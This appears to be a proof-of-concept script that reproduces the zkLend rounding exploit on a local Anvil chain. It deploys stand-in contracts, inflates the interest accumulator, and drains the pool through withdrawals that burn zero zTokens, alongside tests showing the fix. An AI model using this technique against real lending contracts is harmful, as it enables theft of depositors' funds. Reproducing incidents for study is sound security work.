#!/usr/bin/env bash
# defi22 — zkLend accumulator-rounding drain ($9.5M, Feb 2025). Faithful Solidity/Foundry
# reproduction (the original was Cairo/Starknet). Requires foundry (forge, cast, anvil).
set -e
forge test -vv    # ACT1 honest 100->100 / ACT2 drain: 5 free withdrawals, pool 100->0, attacker burns 0 zTokens / ACT3 fix reverts

echo "=== live drain on a local Anvil chain: the free withdrawal (Market -> attacker, 0 zTokens burned) ==="
anvil --port 8600 --silent & AN=$!; sleep 2
RPC=http://127.0.0.1:8600
DEP=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80   # LP + deployer
AK=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d    # attacker
ATK=$(cast wallet address --private-key $AK)
RAY=1000000000000000000000000000
UND=$(forge create src/Underlying.sol:Underlying --rpc-url $RPC --private-key $DEP --broadcast 2>/dev/null | grep "Deployed to:" | awk '{print $3}')
MKT=$(forge create src/Market.sol:Market --rpc-url $RPC --private-key $DEP --broadcast --constructor-args $UND 2>/dev/null | grep "Deployed to:" | awk '{print $3}')
cast send $UND "mint(address,uint256)" $(cast wallet address --private-key $DEP) 100000000000000000000 --rpc-url $RPC --private-key $DEP >/dev/null
cast send $UND "approve(address,uint256)" $MKT 100000000000000000000 --rpc-url $RPC --private-key $DEP >/dev/null
cast send $MKT "deposit(uint256)" 100000000000000000000 --rpc-url $RPC --private-key $DEP >/dev/null
cast send $MKT "_inflateAccumulator(uint256)" 20000000000000000000000000000000000000000000000 --rpc-url $RPC --private-key $DEP >/dev/null
echo "BEFORE  pool=$(cast call $MKT 'underlyingBalance()(uint256)' --rpc-url $RPC)  attacker_zTokens=$(cast call $MKT 'zBalance(address)(uint256)' $ATK --rpc-url $RPC)  attacker_wstETH=$(cast call $UND 'balanceOf(address)(uint256)' $ATK --rpc-url $RPC)"
cast send $MKT "withdraw(uint256)" 19000000000000000000 --rpc-url $RPC --private-key $AK >/dev/null   # floor(19/20)=0 zTokens
echo "AFTER   pool=$(cast call $MKT 'underlyingBalance()(uint256)' --rpc-url $RPC)  attacker_zTokens=$(cast call $MKT 'zBalance(address)(uint256)' $ATK --rpc-url $RPC)  attacker_wstETH=$(cast call $UND 'balanceOf(address)(uint256)' $ATK --rpc-url $RPC)"
kill $AN
